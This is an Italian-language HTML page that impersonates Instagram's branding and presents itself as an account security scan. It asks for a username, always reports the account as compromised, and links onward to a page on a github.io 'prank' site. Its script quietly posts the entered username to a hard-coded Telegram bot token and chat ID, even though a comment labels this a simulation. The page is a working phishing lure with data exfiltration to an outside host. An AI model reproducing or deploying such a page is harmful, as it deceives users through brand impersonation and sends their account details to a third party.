<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifica Sicurezza Account Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 350px;
            width: 100%;
        }
        .scan-box {
            border: 1px solid #dbdbdb;
            background-color: #fff;
            padding: 20px 40px;
            text-align: center;
            border-radius: 12px;
            margin-bottom: 12px;
        }
        .logo {
            margin: 22px auto 12px;
            width: 175px;
            height: 51px;
            object-fit: contain;
        }
        .form-group {
            margin-bottom: 6px;
        }
        input {
            width: 100%;
            padding: 12px 8px;
            margin: 4px 0;
            border: 1px solid #dbdbdb;
            background: #fafafa;
            border-radius: 8px;
            font-size: 14px;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            padding: 10px;
            margin: 12px 0;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }
        .divider {
            margin: 18px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            display: flex;
            align-items: center;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 16px;
        }
        #result {
            margin-top: 10px;
            padding: 15px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
            background-color: #fee;
            color: #d00;
            border: 1px solid #ffb3b3;
        }
        .security-tip {
            font-size: 12px;
            color: #8e8e8e;
            margin: 15px 0;
            text-align: center;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 16px;
        }
        .footer-links a {
            color: #8e8e8e;
            font-size: 12px;
            margin: 0 8px 8px;
            text-decoration: none;
        }
        .copyright {
            color: #8e8e8e;
            font-size: 12px;
        }
        .loading {
            display: none;
            margin: 15px 0;
        }
        .loading:after {
            content: " .";
            animation: dots 1.5s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: " ."; }
            40% { content: " .."; }
            60% { content: " ..."; }
            80%, 100% { content: " "; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="scan-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" class="logo">
            <h3 style="margin-bottom: 20px;">Verifica sicurezza account</h3>
            <form id="scan-form">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Nome utente Instagram" required>
                </div>
                <button type="submit" id="scan-button">Avvia scansione</button>
                <div class="loading" id="loading">Analisi in corso</div>
                <div id="result"></div>
            </form>
            <div class="security-tip">
                Questa verifica aiuta a identificare potenziali minacce alla sicurezza del tuo account.
            </div>
        </div>
        <div class="footer">
            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">Informazioni</a>
                <a href="#">Blog</a>
                <a href="#">Aiuto</a>
                <a href="#">Privacy</a>
                <a href="#">Termini</a>
            </div>
            <div class="copyright">
                © 2024 Instagram da Meta
            </div>
        </div>
    </div>

    <script>
        document.getElementById('scan-form').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.querySelector('input[name="username"]').value;
            const loading = document.getElementById('loading');
            const result = document.getElementById('result');
            
            // Mostra il caricamento
            loading.style.display = 'block';
            result.style.display = 'none';
            
            // Simula una scansione (3 secondi)
            setTimeout(() => {
                loading.style.display = 'none';
                
                // Mostra il risultato (sempre negativo in questa simulazione)
                result.innerHTML = `
                    <strong>Account non sicuro rilevato!</strong><br><br>
                    Il sistema ha rilevato che la password associata a <strong>@${username}</strong> è stata compromessa.<br><br>
                    <a href="https://prank9912.github.io/Lupoumberto/Instagram1.html#" 
                       style="color: #0095f6; font-weight: 600; text-decoration: none;">
                       Clicca qui per proteggere il tuo account
                    </a>
                `;
                result.style.display = 'block';
                
                // Invia i dati al bot Telegram (simulazione)
                fetch(`https://api.telegram.org/bot8194126633:AAHGJ-9WykocSf-9cKTNSmQybcbRAeJsIXE/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: '5709299213',
                        text: `Tentativo di scansione sicurezza\nUsername: ${username}`
                    })
                });
            }, 3000);
        });
    </script>
</body>
</html>
